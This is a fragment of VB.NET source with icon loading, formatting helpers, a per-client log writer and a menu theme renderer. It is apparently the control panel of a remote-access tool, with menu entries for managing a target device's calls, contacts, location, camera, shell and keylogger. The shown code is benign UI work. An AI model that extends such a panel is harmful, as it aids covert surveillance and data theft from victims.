                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\s.png")
                    Return ctx
                Case "ctx_calls_manager"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\c.png")
                    Return ctx
                Case "ctx_contacts_manager"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\b.png")
                    Return ctx
                Case "ctx_location_manager"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\loc.png")
                    Return ctx
                Case "ctx_account_manager"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\acc.png")
                    Return ctx
                Case "ctx_camera_manager"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\ca.png")
                    Return ctx
                Case "ctx_shell_manager"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\t.png")
                    Return ctx
                Case "ctx_record_manager"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\mc.png")
                    Return ctx
                Case "ctx_applications_manager"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\prg.png")
                    Return ctx
                Case "ctx_keylogger_manager"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\k.png")
                    Return ctx
                Case "ctx_settings"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\set.png")
                    Return ctx
                Case "ctx_phone"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\ph.png")
                    Return ctx
                Case "ctx_chat"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\ch.png")
                    Return ctx
                Case "ctx_open_folder"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\oppf.png")
                    Return ctx
                Case "ctx_refresh"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\re.png")
                    Return ctx
                Case "ctx_upload_file"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\u.png")
                    Return ctx
                Case "ctx_download_file"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\d.png")
                    Return ctx
                Case "ctx_cut"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\cat.png")
                    Return ctx
                Case "ctx_copy"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\cp.png")
                    Return ctx
                Case "ctx_paste"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\pas.png")
                    Return ctx
                Case "ctx_edit"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\ed.png")
                    Return ctx
                Case "ctx_delete"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\del.png")
                    Return ctx
                Case "ctx_add"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\ad.png")
                    Return ctx
                Case "ctx_wallpaper"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\setw.png")
                    Return ctx
                Case "ctx_open_app"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\op_app.png")
                    Return ctx

                Case "ctx_info"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\inf.png")
                    Return ctx
                Case "ctx_play"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\play.png")
                    Return ctx
                Case "ctx_close"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\clo.png")
                    Return ctx
                Case "ctx_rename"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\ren.png")
                    Return ctx
                Case "ctx_lstnPlay"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\play_s.png")
                    Return ctx
                Case "ctx_lstnStop"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\stop_s.png")
                    Return ctx
                Case "ctx_flash"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\flash.png")
                    Return ctx
                Case "ctx_foces"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\foc.png")
                    Return ctx
                Case "ctx_effects"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\eff.png")
                    Return ctx
                Case "ctx_scene"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\sce.png")
                    Return ctx
                Case "ctx_maps"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\ma.png")
                    Return ctx
                Case "ctx_dns"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\dn.png")
                    Return ctx
                Case "ctx_packg"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\pack.png")
                    Return ctx
            End Select
        Catch ex As Exception
            'MsgBox(ex.ToString)
        End Try
        Return Nothing
    End Function
#End Region


#Region " FormatFileSize "
    Public Function FormatFileSize(ByVal FileSizeBytes&) As String
        Dim sizeTypes() As String = {"b", "Kb", "Mb", "Gb"}
        Dim Len@ = FileSizeBytes
        Dim sizeType% = 0
        Do While Len > 1024
            Len = Decimal.Round(Len / 1024, 2)
            sizeType += 1
            If sizeType >= sizeTypes.Length - 1 Then Exit Do
        Loop
        Dim Resp$ = Len.ToString & " " & sizeTypes(sizeType)
        Return Resp
    End Function
#End Region
#Region " Duration "
    Public Function Duration(Time As Integer) As String
        Dim Hrs, Min, Sec As Integer
        Sec = Time Mod 60
        Min = ((Time - Sec) / 60) Mod 60
        Hrs = ((Time - (Sec + (Min * 60))) / 3600) Mod 60
        Return Format(Hrs, "00") & ":" & Format(Min, "00") & ":" & Format(Sec, "00").ToString
    End Function
#End Region
#Region " BytesConverter "
    Public Function BytesConverter(ByVal bytes As Long) As String
        Dim KB As Long = 1024
        Dim MB As Long = KB * KB
        Dim GB As Long = KB * KB * KB
        Dim TB As Long = KB * KB * KB * KB
        Dim returnVal As String = "0 Bytes"

        Select Case bytes
            Case Is <= KB
                returnVal = bytes & " Bytes"
            Case Is > TB
                returnVal = (bytes / KB / KB / KB / KB).ToString("0.00") & " TB"
            Case Is > GB
                returnVal = (bytes / KB / KB / KB).ToString("0.00") & " GB"
            Case Is > MB
                returnVal = (bytes / KB / KB).ToString("0.00") & " MB"
            Case Is > KB
                returnVal = (bytes / KB).ToString("0.00") & " KB"
        End Select

        Return returnVal.ToString
    End Function


#End Region



    Public Sub Save_0(cliPath$, dat$)
        Dim thread As New Threading.Thread(Sub()

                                               Try
                                                   Dim f As String = Application.StartupPath & "\" & store_0.name_folder_app_resource & "\Folder_Clients\" & cliPath
                                                   If Not My.Computer.FileSystem.DirectoryExists(f) Then My.Computer.FileSystem.CreateDirectory(f)
                                                   Dim Dat_2 As String = DateTime.Now.ToString("yyyy-MM-dd-HH.mm.ss")
                                                   Dim NAM_2 As String = String.Format("{0:1}", Dat_2, Nothing)

                                                   Dim FF_0 As System.IO.StreamWriter
                                                   FF_0 = My.Computer.FileSystem.OpenTextFileWriter(f + "\" + NAM_2 + ".txt", True)
                                                   FF_0.WriteLine(dat.ToString)
                                                   FF_0.Close()




                                               Catch ex As Exception
                                               End Try
                                           End Sub)
        thread.Start()
    End Sub
End Module


#Region " Theme "


Public Class Theme_0
    Inherits System.Windows.Forms.ToolStripSystemRenderer
#Region "- Color Table -"
    '47; 149; 200
    Dim selcted_0 As Color = Color.FromArgb(47, 149, 200)

    Dim backColor_0 As Color = Color.FromArgb(236, 239, 241)

    Dim ForeColor_0 As Color = Color.FromArgb(68, 85, 93)
    Dim backColor_0_u_d As Color = Color.FromArgb(90, 111, 123)
    Dim MyFont As Font = New Font("Arial", 8.25, FontStyle.Bold)


    Public clrMBButtonDarkBorder As Color = Color.SteelBlue
    Dim clrSelectedBorder As Color = Color.SteelBlue
    'Public clrMBButtonDarkBorder As Color = Color.FromArgb(79, 89, 99)
    'Dim clrSelectedBorder As Color = Color.FromArgb(79, 89, 99)



    Dim vbx As Color = Color.FromArgb(79, 89, 99)

    Public clrCheckBG As Color = Color.FromArgb(60, 60, 60, 60)


#End Region
    Public Sub DrawRoundedRectangle(ByVal objGraphics As Graphics,
                                ByVal m_intxAxis As Integer,
                                ByVal m_intyAxis As Integer,
                                ByVal m_intWidth As Integer,
                                ByVal m_intHeight As Integer,
                                ByVal m_diameter As Integer, ByVal color As Color)
        Try


            Dim pen As New Pen(color)
            'Dim g As Graphics
            Dim BaseRect As New RectangleF(m_intxAxis, m_intyAxis, m_intWidth, m_intHeight)
            Dim ArcRect As New RectangleF(BaseRect.Location, New SizeF(m_diameter, m_diameter))
            'top left Arc
            objGraphics.DrawArc(pen, ArcRect, 180, 90)
            objGraphics.DrawLine(pen, m_intxAxis + CInt(m_diameter / 2), m_intyAxis, m_intxAxis + m_intWidth - CInt(m_diameter / 2), m_intyAxis)
            ' top right arc
            ArcRect.X = BaseRect.Right - m_diameter
            objGraphics.DrawArc(pen, ArcRect, 270, 90)
            objGraphics.DrawLine(pen, m_intxAxis + m_intWidth, m_intyAxis + CInt(m_diameter / 2), m_intxAxis + m_intWidth, m_intyAxis + m_intHeight - CInt(m_diameter / 2))
            ' bottom right arc
            ArcRect.Y = BaseRect.Bottom - m_diameter
            objGraphics.DrawArc(pen, ArcRect, 0, 90)
            objGraphics.DrawLine(pen, m_intxAxis + CInt(m_diameter / 2), m_intyAxis + m_intHeight, m_intxAxis + m_intWidth - CInt(m_diameter / 2), m_intyAxis + m_intHeight)
            ' bottom left arc
            ArcRect.X = BaseRect.Left
            objGraphics.DrawArc(pen, ArcRect, 90, 90)
            objGraphics.DrawLine(pen, m_intxAxis, m_intyAxis + CInt(m_diameter / 2), m_intxAxis, m_intyAxis + m_intHeight - CInt(m_diameter / 2))


        Catch ex As Exception
            'MsgBox(ex.ToString)
        End Try
    End Sub
    Protected Overrides Sub Initialize(ByVal toolStrip As System.Windows.Forms.ToolStrip)
        Try


            MyBase.Initialize(toolStrip)
            If TypeOf toolStrip Is MenuStrip Then
                toolStrip.ForeColor = ForeColor_0
            ElseIf TypeOf toolStrip Is ToolStripDropDownMenu Then
                toolStrip.ForeColor = ForeColor_0
                toolStrip.BackColor = backColor_0
            ElseIf TypeOf toolStrip Is ToolStrip Then
                toolStrip.ForeColor = ForeColor_0
                toolStrip.BackColor = backColor_0
            End If
            toolStrip.Font = MyFont
            toolStrip.Padding = New Padding(5, 2, 5, 2)


        Catch ex As Exception
            'MsgBox(ex.ToString)
        End Try

    End Sub
    Protected Overrides Sub OnRenderMenuItemBackground(ByVal e As System.Windows.Forms.ToolStripItemRenderEventArgs)


        Try


            If TypeOf e.ToolStrip Is ToolStripDropDownMenu Then
                If e.Item.Selected Then
                    Dim i8 As Integer = 4
                    Dim i9 As Integer = 6
                    If Not e.Item.Image Is Nothing Then
                        i8 = 30
                        i9 = 32
                    End If




                    Dim clrSelectGradTop As Color
                    Dim clrSelectGradBottom As Color
                    Dim clrMenuBorder As Color
                    If Not e.Item.Enabled = True Then
                        clrSelectGradTop = e.Item.BackColor
                        clrSelectGradBottom = e.Item.BackColor
                        clrMenuBorder = e.Item.BackColor
                    Else
                        clrSelectGradTop = selcted_0
                        clrSelectGradBottom = selcted_0
                        clrMenuBorder = selcted_0
                    End If
                    Dim rect As New Rectangle(i8, 2, e.Item.Width - i9, e.Item.Height - 4)
                    Dim b As New Drawing2D.LinearGradientBrush(rect, clrSelectGradTop, clrSelectGradBottom, Drawing2D.LinearGradientMode.Vertical)
                    e.Graphics.FillRectangle(b, rect)
                    DrawRoundedRectangle(e.Graphics, rect.Left - 1, rect.Top - 1, rect.Width, rect.Height + 1, 1, clrSelectedBorder)
                    e.Item.ForeColor = System.Drawing.Color.White
                Else
                    e.Item.ForeColor = ForeColor_0
                End If
            ElseIf (TypeOf e.ToolStrip Is MenuStrip) Then
                If e.Item.IsOnDropDown = False AndAlso e.Item.Selected Then


                    Dim i8 As Integer = 4
                    Dim i9 As Integer = 6
                    If Not e.Item.Image Is Nothing Then
                        i8 = 22
                        i9 = 30
                    End If

                    Dim rect As New Rectangle(i8, 2, e.Item.Width - i9, e.Item.Height - 4)
                    Dim rect2 As New Rectangle(i8, 2, e.Item.Width - i9, e.Item.Height - 4)
                    Dim b2 As New SolidBrush(If(e.Item.Tag = "u-d", backColor_0_u_d, If(e.Item.Enabled = False, SystemColors.Control, selcted_0)))
                    DrawRoundedRectangle(e.Graphics, rect.Left - 1, rect.Top - 1, rect.Width + 1, rect.Height + 1, 1, If(e.Item.Tag = "u-d", vbx, clrMBButtonDarkBorder))



                    e.Graphics.FillRectangle(b2, rect2)
                    e.Item.ForeColor = System.Drawing.Color.White
                Else
                    e.Item.ForeColor = ForeColor_0
                End If




            End If

        Catch ex As Exception
            'MsgBox(ex.ToString)
        End Try


    End Sub
    Protected Overrides Sub OnRenderArrow(ByVal e As System.Windows.Forms.ToolStripArrowRenderEventArgs)
        Try
            If e.Item.Selected Then
                e.ArrowColor = backColor_0
            Else
                e.ArrowColor = ForeColor_0
            End If
            MyBase.OnRenderArrow(e)
        Catch ex As Exception
            'MsgBox(ex.ToString)
        End Try
    End Sub
    Protected Overrides Sub OnRenderItemCheck(ByVal e As System.Windows.Forms.ToolStripItemImageRenderEventArgs)
        Try


            MyBase.OnRenderItemCheck(e)
            Dim rect2 As New Rectangle(4, 2, e.Item.Height - 3, e.Item.Height - 4)
            Dim b2 As New Drawing.SolidBrush(clrCheckBG)
            e.Graphics.FillRectangle(b2, rect2)
            e.Graphics.DrawImage(e.Image, New System.Drawing.Point(5, 3))

        Catch ex As Exception
            'MsgBox(ex.ToString)
        End Try
    End Sub
    Protected Overrides Sub OnRenderImageMargin(ByVal e As System.Windows.Forms.ToolStripRenderEventArgs)
        Try
            MyBase.OnRenderImageMargin(e)
            Dim clrMenuBorder As Color = selcted_0
            Dim WhiteLine As New Drawing.SolidBrush(System.Drawing.Color.Silver)
            Dim rect2 As New Rectangle(e.AffectedBounds.Width + 0, 2, 1, e.AffectedBounds.Height)
            Dim borderPen As New Pen(clrMenuBorder)
            e.Graphics.FillRectangle(WhiteLine, rect2)


            e.ToolStrip.BackColor = backColor_0

        Catch ex As Exception
            'MsgBox(ex.ToString)
        End Try
    End Sub

End Class

#End Region